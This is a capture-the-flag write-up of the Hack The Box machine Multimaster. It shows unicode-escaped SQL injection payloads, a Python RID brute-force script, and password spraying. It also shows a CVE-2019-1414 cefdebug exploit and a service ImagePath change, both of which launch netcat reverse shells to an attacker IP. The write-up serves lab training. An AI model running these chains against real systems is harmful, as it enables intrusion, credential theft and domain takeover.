---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Multimaster

## Summary

[Multimaster](https://app.hackthebox.com/machines/232) is an <mark style="color:red;">insane-rated</mark> box and it truly honors its rating! Gaining the initial foothold involves multiple steps: unicode-escaped **SQLi** ðŸ’‰,  **brute-forcing** **RIDs** via MSSQL ðŸ‘¥, and multiple **password-spraying** attempts :key:. From there, to achieve root, we need to pivot thrice by **exploiting user rights**, **group memberships**, using **public exploits**, and [**ASREPRoasting**](../../tl-dr/active-directory/attacks/as-reproasting.md) users ðŸ”¥.

<table><thead><tr><th width="83">Step</th><th width="220">Action</th><th width="179">Tool</th><th width="274">Gained</th></tr></thead><tbody><tr><td>1</td><td>SQLi</td><td><a href="broken-reference">ffuf</a>, <a href="https://portswigger.net/burp/communitydownload">Burp</a>, <a href="../../tl-dr/web/injections/sqli/sqlmap.md">sqlmap</a></td><td>Cleartext passwords</td></tr><tr><td>2</td><td>Brute-force RIDs</td><td><a href="https://portswigger.net/burp/communitydownload">Burp</a>, Custom script</td><td>Domain users</td></tr><tr><td>3</td><td>Password spray</td><td><a href="../../tl-dr/active-directory/ad-tools/netexec.md">NetExec</a></td><td>Foothold</td></tr><tr><td>4</td><td>Domain enumeration</td><td><a href="../../tl-dr/active-directory/ad-tools/hounds.md">BloodHound</a></td><td><a data-footnote-ref href="#user-content-fn-1">EoP</a> path</td></tr><tr><td>5</td><td>System enumeration</td><td><a data-footnote-ref href="#user-content-fn-2">LOTL</a><strong>,</strong> <a data-footnote-ref href="#user-content-fn-3">PoC</a></td><td><a data-footnote-ref href="#user-content-fn-1">EoP</a> (1)</td></tr><tr><td>6</td><td>System enumeration, password spray</td><td><a data-footnote-ref href="#user-content-fn-2">LOTL</a>, <a href="../../tl-dr/active-directory/ad-tools/netexec.md">NetExec</a></td><td><a data-footnote-ref href="#user-content-fn-1">EoP</a> (2)</td></tr><tr><td>7</td><td>User rights</td><td><a data-footnote-ref href="#user-content-fn-2">LOTL</a>, <a href="../../tl-dr/active-directory/ad-tools/netexec.md">NetExec</a></td><td><a data-footnote-ref href="#user-content-fn-1">EoP</a> (3)</td></tr><tr><td>8</td><td>Group memberships</td><td><a data-footnote-ref href="#user-content-fn-2">LOTL</a></td><td>Domain compromise</td></tr></tbody></table>

## Recon

### Nmap

Let's start with a simple port-scan to see what is listening on the box (Figure 1) and then perform an agreesive (`-A`) scan on the ports found (Figure 2).

{% tabs %}
{% tab title="Nmap scans" %}
{% code overflow="wrap" %}
```bash
# simple port-scan
sudo nmap 10.10.10.179 -T4 -open -p- --min-rate=10000 -oA ./scans/initial_port-scan
# aggresive port-scan on the open ports
sudo nmap 10.10.10.179 -T4 -A -p $(cat ports) --min-rate=10000 -oA ./scans/aggresive_port-scan
```
{% endcode %}
{% endtab %}

{% tab title="File manipulation" %}
```bash
# remove junk lines and rpc ports (49666+)
sudo nano scans/initial_port-scan.nmap
# extract port numbers and arrange them in a single comma-separated line
cat scans/initial_port-scan.nmap | cut -d'/' -f1 | tr '\n' ',' > ports
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_nmap1.png" alt=""><figcaption><p>Figure 1: Scanning the Multimaster machine.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/multi_nmap2.png" alt=""><figcaption><p>Figure 2: Aggresive scan on the open ports.</p></figcaption></figure>

Some interesting things to note from Nmap's output:

1. There are services such as DNS, Kerberos, and LDAP that let us know that **this box is a DC**.
2. A **web server** is listening on port `80`.
3. Port `3389` is open, so **we can access the host via RDP**.
4. Port `5985` is also open; **we can jump into the box with WinRM** as well.
5. The FQDN is `MULTIMASTER.MEGACORP.LOCAL`.

Before moving on enumerating the services, we should add the hostname, the domain, and the FQDN to our local DNS file:

```bash
$ grep multi /etc/hosts
10.10.10.179   multimaster megacorp.local multimaster.megacorp.local
```

We will start with the web server as it usually represents the largest attack surface, and then move on to SMB and LDAP.&#x20;

### HTTP

The site seems static; nothing really works. The only interesting bit is the _Colleague Finder_ searh bar. Searching for an `a` returns everyone who has an `a` in the name (Figure 3).

<figure><img src="../../.gitbook/assets/multimaster_finder.png" alt=""><figcaption><p>Figure 3: The Colleague Finder search bar.</p></figcaption></figure>

By intercepting the request with Burp, we can see that its sends a POST request to `/api/getColleagues` formatting our input as JSON (Figure 4).

<div align="center"><figure><img src="../../.gitbook/assets/multimaster_cf_burp.png" alt=""><figcaption><p>Figure 4: The POST request with our input formatted as JSON data.</p></figcaption></figure></div>

Performing directory busting with [Ffuf](broken-reference) results in, almost exclusively, [`403 Forbidden`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403) responses (Figure 5), which suggests that some kind of filtering is happening either within the application itself or by a [WAF](../../tl-dr/web/web-tools/wafs.md). Introducing a 1 second delay between each request seems to still trigger the filter, so we will let our dirbusting efforts aside for now.

{% code overflow="wrap" %}
```bash
ffuf -u http://10.10.10.179/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ic
```
{% endcode %}

<figure><img src="../../.gitbook/assets/multi_ffuf.png" alt=""><figcaption><p>Figure 5: Dirbusting is prevented by a WAF.</p></figcaption></figure>

Scanning for [WAFs](../../tl-dr/web/web-tools/wafs.md), nothing is detected which suggests that the filtering happens within the application itself (Figure 6).

<figure><img src="../../.gitbook/assets/multi_waf_scans.png" alt=""><figcaption><p>Figure 6: Scanning for WAFs comes back empty-handed.</p></figcaption></figure>

## SQLi

### Manual

The only avenue to explore on the web server seems to be the _Colleague Finder_ search bar reques&#x74;_._ Playing around with common [SQLi](../../tl-dr/web/injections/sqli/sqli-101.md) detection payloads returns, again, a `403 Forbidden` response. For detecting an SQLi flaw, our initial goal is to try and induce some kind of server error which is [typically done](../../tl-dr/web/injections/sqli/sqli-101.md#detection) using special characters. So, we can fuzz the endpoint withsuch a list and check what the filter blocks (Figure 7).&#x20;

{% code overflow="wrap" %}
```bash
ffuf -u http://10.10.10.179/api/getColleagues -X POST -d '{"name":"FUZZ}' -H 'Content-Type: application/json;charset=utf-8' -p 5 -t 1 -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -c -ic -mc 403
```
{% endcode %}

<table><thead><tr><th width="152">Flag</th><th>Description</th></tr></thead><tbody><tr><td><code>-u</code>, <code>-w</code></td><td>Specify the URL and the wordlist.</td></tr><tr><td><code>-X</code>, <code>-d</code>, <code>-H</code></td><td>Specify the HTTP method, JSON data, and, following Fuff's <a href="https://github.com/ffuf/ffuf/wiki#request-body-data">documentation</a>, Content-Type header.</td></tr><tr><td><code>-c</code>, <code>-ic</code></td><td>Colorize output and ignore any comments within the wordlist file.</td></tr><tr><td><code>-p</code>, <code>-t</code></td><td>To deal with the WAF, we need to slow down the requests per second by introducing a delay among each and reducing the concurrency from 40 (default) to 1.</td></tr><tr><td><code>-mc</code></td><td>Matching only the status codes of interest.</td></tr></tbody></table>

<figure><img src="../../.gitbook/assets/multi_specialchars_fuzz.png" alt=""><figcaption><p>Figure 7: Adapting the Fuff command to the WAF and status code 500.</p></figcaption></figure>

The most common SQLi-detection method comes back: the `'` character. We are able to confirm this behaviour manually using Burp (Figure 8.1). If we closely inspect the request, we will notice that the `Content-Type` header includes the `charset=utf-8` string. [UTF-8](https://en.wikipedia.org/wiki/UTF-8) is an is an encoding system for Unicode, and this suggests that we might need to Unicode-escape our input in order to bypass the server filter. We can test this by escaping unicode characters using [CyberChef ](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters\('%5C%5Cu',true,4,true\)\&input=Jw)or [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) (Figure 8.2) and see how the server responds back.

&#x20;

<figure><img src="../../.gitbook/assets/multi_burp_requests.png" alt=""><figcaption><p>Figure 8: Sending an ASCII (1) and a Unicode-escaped (2) payload results in different server responses.</p></figcaption></figure>

This seems to have worked! Before moving on sending payloads, lets remind ourselves what we know about the database:

1. It is a Windows box, so the DBMS is probably MSSQL.
2. When we sent the `a` character, we got back 5 fields: `id`, `name`, `position`, `email`, and `src`. This means that this particular table has at least 5 columns.
3. All fields but `id` accept strings, thus, we can use any of them to exfiltrate data.

We can start enumerating the database by sending a payload to confirm the number of columns. If we send a query inlcuding 5 columns it comes back with data (Figure 9.1), whereas if we add more it results in an index error and comes back `null` (Figure 9.2).

```sql
a' UNION SELECT 1,2,3,4,5-- -
```

<figure><img src="../../.gitbook/assets/multi_col_num.png" alt=""><figcaption><p>Figure 9: Selecting 5 columns works (1), but adding more results in a NULL response (2).</p></figcaption></figure>

We can now continue our enumeration by finding out:

1. What database(s) exist within the DBMS.
   * There is only 1 non-default database: `Hub_DB` (Figure 10.1).
2. What tables exist in the database of interest.
   * There are 2 tables: `Colleagues` and `Logins` (Figure 10.2).
3. What columns exists within the table of interest.
   * There are 3 columns on the `Login` table: `id`, `password`, and `username` (Figure 10.3).
4. What data is available with the table.
   * There are 17 users within the `Login` table (Figure 10.4).

{% tabs %}
{% tab title="Databases" %}
```sql
a' UNION ALL SELECT 1,name,3,4,5 from master..sysdatabases-- -
```
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```sql
a' UNION ALL SELECT 1,name,3,4,5 FROM Hub_DB..sysobjects WHERE xtype = 'U'-- -
```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```sql
a' UNION ALL SELECT 1,name,3,4,5 FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Logins')-- -
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
```sql
a' UNION ALL SELECT id,username,password,4,5 FROM Hub_DB..Logins-- -
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_db_enum.png" alt=""><figcaption><p>Figure 10: Enumerating databases (1), tables (2), columns (3), and dumping data (4).</p></figcaption></figure>

### Automated

We could also automate the above process by capturing the HTTP request from Burp to a file (Figure 11) and feeding it to [SQLMap](../../tl-dr/web/injections/sqli/sqlmap.md) (Figure 12). Notice, that we put an `*` symbol where we want SQLMap to inject the payload (the value of the `name` parameter) prior copying the request to a file.

<div align="center" data-full-width="true"><figure><img src="../../.gitbook/assets/multi_write_req.png" alt="" width="533"><figcaption><p>Figure 11: Writing the HTTP request to a file.</p></figcaption></figure></div>

{% code overflow="wrap" %}
```bash
sqlmap -r getcolleagues.req --batch -v 1 --level=5 --risk=3 --delay=3 --tamper=charunicodeescape --dbms=mssql --os=Windows --technique=U --proxy=http://127.0.0.1:8080
```
{% endcode %}

<table><thead><tr><th width="341">Flag</th><th>Description</th></tr></thead><tbody><tr><td><code>-r</code>, <code>--batch</code>, <code>-v</code></td><td>Pass request file, choose the defaults in every prompt, set verbosity levels.</td></tr><tr><td><code>--level</code>, <code>--risk</code></td><td>Level and risks of test to perform.</td></tr><tr><td><code>--delay</code></td><td>Introduce a delay between each request to avoid getting blocked by the filter.</td></tr><tr><td><code>--tamper=charunicodeescape</code></td><td>Unicode-escape non-encoded payload characters.</td></tr><tr><td><code>--dbms</code>, <code>--os</code></td><td>Specify what we already know, the DBMS type and the operating system.</td></tr><tr><td><code>--technique</code></td><td>By default, SQLMap tests for everything which can take a lot of time. Since <code>UNION</code> is the most common SQLi method, we can start with that.</td></tr><tr><td><code>--proxy</code></td><td>Send each request via proxy, so we can see exactly what's happening.</td></tr></tbody></table>



<figure><img src="../../.gitbook/assets/multi_sqlmap_detect.png" alt=""><figcaption><p>Figure 12: SQLMap identidied the number of columns, the vulnerable parameter, and provided us with a (not unicode-escaped) payload.</p></figcaption></figure>

We can now do the same process as we did manually, that is, enumerating:

1. Current database's name (Figure 13.1)
2. Tables (Figure 13.2)
3. Columns (Figure 13.3)
4. Dump data (Figure 13.4)&#x20;

{% tabs %}
{% tab title="Current DB" %}
{% code overflow="wrap" %}
```bash
sqlmap -r getcolleagues.req --current-db --batch --tamper=charunicodeescape
```
{% endcode %}
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```bash
sqlmap -r getcolleagues.req --current-db --batch --tamper=charunicodeescape -D Hub_DB --tables
```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```bash
sqlmap -r getcolleagues.req --current-db --batch --tamper=charunicodeescape -D Hub_DB -T Logins --columns
```
{% endcode %}
{% endtab %}

{% tab title="Data" %}
{% code overflow="wrap" %}
```bash
sqlmap -r getcolleagues.req --current-db --batch --tamper=charunicodeescape -D Hub_DB -T Logins --dump
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_sqlmap_process.png" alt=""><figcaption><p>Figure 13: Using SQLMap for enumerating the current database's name (1), its tables (2), the table's columns (3), and, finally, dumping the table's data.</p></figcaption></figure>

SQLMap outputs the table data in a handy CSV file which we can manipulate and pass it to hashcat. Doing that results in 17 usernames and 4 hashes. Passing those hashes to **hashcat's auto-detect mode**, comes back with 4 suggestions (Figure 14).

{% tabs %}
{% tab title="1. Extract Hashes" %}
```bash
cat Logins.csv | cut -d',' -f2 | sort | uniq > hashes
```
{% endtab %}

{% tab title="2. Extract Usernames" %}
```bash
cat Logins.csv | cut -d',' -f3 | sort | uniq > usernames
```
{% endtab %}

{% tab title="3. Remove junk lines manually" %}
```bash
nano hashes
nano usernames
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_hashcat.png" alt=""><figcaption><p>Figure 14: Hashcat's auto-detect mode let's us know the possible hash types.</p></figcaption></figure>

The `Keccak-384` mode works and cracks 3 out of the 4 hashes.

{% code overflow="wrap" %}
```bash
$ hashcat -m 17900 hashes --show
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
```
{% endcode %}

With a username list and 3 cleartext password at hand, we can try a **password-spray attack** using SMB, WinRM, or RDP, but, unfortunately, noone of those work.

{% tabs %}
{% tab title="1. Extract Cleartext Passwords" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>hashcat -m 17900 hashes --show | cut -d":" -f2 > clear_passwords
</strong></code></pre>
{% endtab %}

{% tab title="2. Password Spray Services" %}
{% code overflow="wrap" %}
```bash
nxc smb 10.10.10.179 < smb | winrm | rdp > -u usernames -p clear_passwords | grep +
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Domain Enumeration

### Hacking MSSQL

Not much avenues to go from here, so we need some help. Apparently there is a way to **enumerate domain accounts via an SQLi attack**. Reading [0xdf's walkthough](https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html), which takes information from [this](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) article, we can see how this can be done.

When SQLMap detected the SQLi, it gaves up a payload which warned us that is not unicode-escaped (Figure 12). So the first step, is to take this payload and use [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) (Figure 15) or [CyberChef](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters\('%5C%5Cu',false,4,true\)) to unicode-escape it ourselves.

{% code overflow="wrap" %}
```bash
# SQLMap's payload
test' UNION ALL SELECT 66,66,66,CHAR(113)+CHAR(120)+CHAR(106)+CHAR(120)+CHAR(113)+CHAR(80)+CHAR(101)+CHAR(67)+CHAR(110)+CHAR(101)+CHAR(88)+CHAR(85)+CHAR(84)+CHAR(108)+CHAR(86)+CHAR(80)+CHAR(66)+CHAR(97)+CHAR(69)+CHAR(71)+CHAR(88)+CHAR(65)+CHAR(83)+CHAR(73)+CHAR(114)+CHAR(67)+CHAR(85)+CHAR(79)+CHAR(119)+CHAR(117)+CHAR(120)+CHAR(122)+CHAR(103)+CHAR(114)+CHAR(122)+CHAR(82)+CHAR(97)+CHAR(79)+CHAR(104)+CHAR(102)+CHAR(113)+CHAR(103)+CHAR(117)+CHAR(119)+CHAR(99)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113),66-- lysJ
```
{% endcode %}

<figure><img src="../../.gitbook/assets/multi_enum_domain_1.png" alt=""><figcaption><p>Figure 15: Using HackVertor to unicode-escape our payload.</p></figcaption></figure>

Now we need to:

1. Get the domain name using `SELECT DEFAULT_DOMAIN()` (Figure 16.1).
2. Get the domain RID using `SUSER_SID()` on a known group, such as `Domain Admins` (Figure 16.2).
3. Build a user RID and check it using `SUSER_SNAME()` (Figure 16.3).

{% tabs %}
{% tab title="1. Domain Name" %}
```sql
test' UNION ALL SELECT 66,66,66,DEFAULT_DOMAIN(),66-- lysJ
```
{% endtab %}

{% tab title="2. Domain RID" %}
{% code overflow="wrap" %}
```sql
test' UNION ALL SELECT 66,66,66,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),66-- lysJ
```
{% endcode %}
{% endtab %}

{% tab title="3. Confirm Admin's RID" %}
{% code overflow="wrap" %}
```sql
test' UNION ALL SELECT 66,66,66,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),66-- lysJ
```
{% endcode %}
{% endtab %}
{% endtabs %}

Since the RID is `0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000`, we can extract the domain RID: `0x0105000000000005150000001c00d1bcd181f1492bdfc236`. We know that the [`Administrators` RID is `500`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts#administrator-account-attributes) and we can make this RID by:

1. Taking this value (`500`)
2. Converting to hex (`0x1f4`)
3. Padding it to 4 bytes (`0x000001f4`)
4. And reversing the byte order (`0xf4010000`)

As a result, the `Administrator` RID should be `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`. We can confirm this using `SUSER_NAME`.

<figure><img src="../../.gitbook/assets/multi_enum_domain_steps.png" alt=""><figcaption><p>Figure 16: Enumerating the domain name (1), the Domain Admins RID (2), and confirming the Administrator's RID (3).</p></figcaption></figure>

We can now use [0xdf](https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html)'s Python3 script to brute force the domain users:

```python
#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time


payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""


def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
```

After running the script we get a lot of new users back. After cleaning this list, we can try again a password-spray and, luckily, this time we get a hit back (Figure 17).

{% tabs %}
{% tab title="1. Domain users list" %}
```bash
# execute the script
./brute_force_sids.py
# copy and paste the results to a file
nano script_users
# extract usernames
cat script_users | cut -d"\\" -f2 > sid_users
# manually remove junk lines
nano sid_users
```
{% endtab %}

{% tab title="2. Password Spray" %}
{% code overflow="wrap" %}
```bash
# password spray
nxc smb 10.10.10.179 -u sid_users -p clear_passwords | grep +
# write password to a file
echo "finance1" > tushi_pass
# check winrm access
nxc winrm 10.10.10.179 -u tushikikatomo -p tushi_pass
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_password_spray_tushi.png" alt=""><figcaption><p>Figure 17: Password spraying reveals credentials for a new user.</p></figcaption></figure>

### BloodHound

Before anything else, let's log into the box using WinRM and grab the `user.txt` flag ðŸš©. Now that we got our foothold, we can collect domain information to analyze using SharpHound (Figure 18).

{% tabs %}
{% tab title="1. WinRM" %}
```bash
evil-winrm -i 10.10.10.179 -u tushikikatomo -p $(cat tushi_pass)
```
{% endtab %}

{% tab title="2. user.txt" %}
```powershell
type ..\desktop\user.txt
```
{% endtab %}

{% tab title="3. SharpHound" %}
```powershell
# upload the executable to the target
upload SharpHound/SharpHound.exe
# run SharpHound
.\SharpHound.exe -c all
# list output file's name
dir
# download zip file to the attack host
download 20240331171236_BloodHound.zip
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_sharphound.png" alt=""><figcaption><p>Figure 18: Uploiading and running SharpHound on the target.</p></figcaption></figure>

Sadly, after analyzing the domain data, it seems that the `tushikikatomo` account does not have any potential privilege escalation avenues. There are some interesting things that pop up though:

1. There is a non-default group called `Developers` with 4 members (Figure 19).
2. `sbauer` has [GenericWrite](../../tl-dr/active-directory/permissions/genericwrite.md) rights over `Jorden` (Figure 20).
3. `jorden` is a member of the [`Server Operators`](../../tl-dr/active-directory/groups/server-operators.md) group (Figure 21).

<figure><img src="../../.gitbook/assets/multi_bh_dev_group.png" alt=""><figcaption><p>Figure 19: The Developers domain group.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/multi_sbauer_jorden.png" alt=""><figcaption><p>Figure 20: The account sbauer has GenericWrite rights over the account Jorden.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/multi_server_operators.png" alt=""><figcaption><p>Figure 21: BloodHound reveals that sbauer is a member of the Server Operators group.</p></figcaption></figure>

## System Enumeration

### Known Exploits

Having no solid plan to move forward, we can start enumerating the system to see if we can find something there. Checking for running processes, we notice multiple instances of the process `Code` running (Figure 22). In addition, looking for the installed programs we find out that **Visual Studio** is also installed (Figure 23), so we can safely assume that `Code` probably refers to **Visual Studio Code**.

{% tabs %}
{% tab title="Processes" %}
```powershell
Get-Process
```
{% endtab %}

{% tab title="Installed Programs" %}
```powershell
dir "c:\program files (x86)"
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_ps.png" alt=""><figcaption><p>Figure 22: Checking for running processes.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/multi_vs.png" alt=""><figcaption><p>Figure 23: Enumerating installed programs.</p></figcaption></figure>

By inspecting what ports listen locally on the host, we can see some relationships between the `Code` instances and some of the ports (Figure 24).

<figure><img src="../../.gitbook/assets/multi_ps_ports.png" alt=""><figcaption><p>Figure 24: Connecting the dots!</p></figcaption></figure>

After researching for a bit, we find out that there is an **RCE vulnerability** ([CVE-2019-1414](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2019-1414)) in VSC related to its debugger, which is explained [here](https://iwantmore.pizza/posts/cve-2019-1414.html) and [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944). There is also an [existing PoC](https://github.com/taviso/cefdebug), which includes [pre-compiled binaries](https://github.com/taviso/cefdebug/releases) and by following the steps outlined, we can achieve RCE as `cyork` (Figure 25).

{% tabs %}
{% tab title="1. Uplolad" %}
{% code overflow="wrap" %}
```powershell
# move to writable directory
cd C:\Windows\System32\spool\drivers\color
# upload executables
upload cefdebug.exe
upload nc64.exe
```
{% endcode %}
{% endtab %}

{% tab title="2. Start Listener" %}
{% code overflow="wrap" %}
```bash
# start listener on the attack host
nc -lvnp 1337
```
{% endcode %}
{% endtab %}

{% tab title="3. Exploit" %}
{% code overflow="wrap" %}
```powershell
# scan the local machine for CEF debuggers
.\cefdebug.exe
# send reverse shell command
.\cefdebug.exe --code "process.mainModule.require('child_process').exec('C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.6 1337 -e powershell')" --url ws://127.0.0.1:26519/62fb7883-8db3-47e2-8caf-4495af6fc875
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_rce_cyork.png" alt=""><figcaption><p>Figure 25: Receiving a reverse shell as the user cyork.</p></figcaption></figure>

### DLL in a Haystack

Enumerating the system as `cyork`, we see that we have access to the web root directory (`c:\inetpub\wwwroot\`). In the `\bin` folder there, there is a file called `MultimasterAPI.DLL` which, given that it is named after the box, sounds pretty interesting (Figure 26).&#x20;

<figure><img src="../../.gitbook/assets/multi_dll.png" alt=""><figcaption><p>Figure 26: Enumerating the web root directory.</p></figcaption></figure>

After transferring the DLL in our attack host, we can run [`strings`](https://linux.die.net/man/1/strings) to see if anything insteresting comes up.  As mentioned [here](https://en.wikipedia.org/wiki/Dynamic-link_library), DLL's format can differ depending on Windows version, so it's best to run `strings` with different types of encoding options. By doing that, a database password is revealed (Figure 27).

{% hint style="danger" %}
The file transfer through an HTTP or SMB server was a bit phinicky, so we ended up doing it through the `tushikikatomo`'s WinRM session.
{% endhint %}

{% tabs %}
{% tab title="1. Enumeration" %}
```powershell
# enumerate the web root folder
cd c:\inetpub\wwwroot\
# list bin directory
dir bin
```
{% endtab %}

{% tab title="2. Copy DLL to a Writeable Dir" %}
```bash
# move to writeable directory
cd C:\Windows\System32\spool\drivers\color
# copy the DLL
copy c:\inetpub\wwwroot\bin\MultimasterAPI.dll .
```
{% endtab %}

{% tab title="3. DLL  Transfer" %}
{% code overflow="wrap" %}
```powershell
# from tushikikatomo's WinRM session

# move to the directory
cd C:\Windows\System32\spool\drivers\color
# download the DLL
download MultimasterAPI.dll
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% code overflow="wrap" %}
```bash
# inspect file type
file MultimasterAPI.dll
# run strings on the file
strings MultimasterAPI.dll | grep pass
# run strings with 16-bit encoding on the file 
strings -eb MultimasterAPI.dll | grep pass
```
{% endcode %}

<figure><img src="../../.gitbook/assets/multi_strings.png" alt=""><figcaption><p>Figure 27: Running strings with different encoding options.</p></figcaption></figure>

When we use the newly obtained password to, once again, **password spray** our our domain username list, we get a hit back (Figure 28).

```bash
# write the password to a file
echo "D3veL0pM3nT!" > db_pass
# password spray using the domain username list
nxc smb 10.10.10.179 -u sid_users -p db_pass | grep +
# check remote access
nxc winrm 10.10.10.179 -u sbauer -p db_pass
# rename the password file
mv db_pass sbauer_pass
```

<figure><img src="../../.gitbook/assets/multi_password_spray_sbauer.png" alt=""><figcaption><p>Figure 28: Password spraying move us forward once more!</p></figcaption></figure>

## GenericWrite Rights

During our [#domain-enumeration](multimaster.md#domain-enumeration "mention"), we saw that `sbauer` has [`GenericWrite`](../../tl-dr/active-directory/permissions/genericwrite.md) rights over `jorden` who is a member of the [`Server Operators`](../../tl-dr/active-directory/groups/server-operators.md) group. This allows us to compromise the latter by changing its `Does not require preauth` option (Figure 29) which makes the account susceptible to [ASREPRoasting](../../tl-dr/active-directory/attacks/as-reproasting.md) (Figure 30).

{% tabs %}
{% tab title="1. WinRM" %}
```bash
evil-winrm -i 10.10.10.179 -u sbauer -p $(cat sbauer_pass)
```
{% endtab %}

{% tab title="2. Preauth setting" %}
```powershell
# set the preauth option to true
Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $true
# check that it worked
Get-ADUSer -Filter 'DoesNotRequirePreAuth -eq $true'
```
{% endtab %}

{% tab title="3. ASREPRoast " %}
{% code overflow="wrap" %}
```bash
nxc ldap 10.10.10.179 -u sbauer -p sbauer_pass --asreproast asreproastable_users.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_set_preauth.png" alt=""><figcaption><p>Figure 29: Setting the PREAUTH for the account jorden.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/multi_asreproasting.png" alt=""><figcaption><p>Figure 30: ASREPRoasting jorden!</p></figcaption></figure>

After cracking the hash, we can jump into the box as `jorden`.

{% tabs %}
{% tab title="1. Crack" %}
```bash
hashcat -m18200 asreproastable_users.txt /usr/share/wordlists/rockyou.txt
```
{% endtab %}

{% tab title="2. WinRM" %}
```bash
evil-winrm -i 10.10.10.179 -u jorden -p $(cat jorden_pass)
```
{% endtab %}
{% endtabs %}

## Server Operators

Members of the [`Server Operators`](../../tl-dr/active-directory/groups/server-operators.md) group have the ability to manage services which can be exploited by changing the `ImagePath` of any privileged service and make it execute a reverse shell instead (Figure 31). We can achieve that using the already uploaded `nc64.exe`.

{% tabs %}
{% tab title="Modify ImagePath" %}
{% code overflow="wrap" %}
```powershell
# change ImagePath
reg add "HKLM\System\CurrentControlSet\services\wuauserv" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\System32\spool\drivers\color\nc64.exe -e powershell.exe 10.10.14.6 1337" /f
```
{% endcode %}
{% endtab %}

{% tab title="Confirm Change" %}
```powershell
reg query "HKLM\System\CurrentControlSet\services\wuauserv"
```
{% endtab %}

{% tab title="Listen" %}
```bash
nc -lvnp 1337
```
{% endtab %}

{% tab title="Start Service" %}
```powershell
Start-Service wuauserv
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/multi_imagepath.png" alt=""><figcaption><p>Figure 31: Modifying the service's ImagePath.</p></figcaption></figure>

We get a `SYSTEM` shell back and we can grab the `root.txt` file ðŸš©(Figure 32).&#x20;

<figure><img src="../../.gitbook/assets/multi_root.png" alt=""><figcaption><p>Figure 32: Multimaster is rooted!</p></figcaption></figure>

## Beyond Root

### SeBackupPrivilege

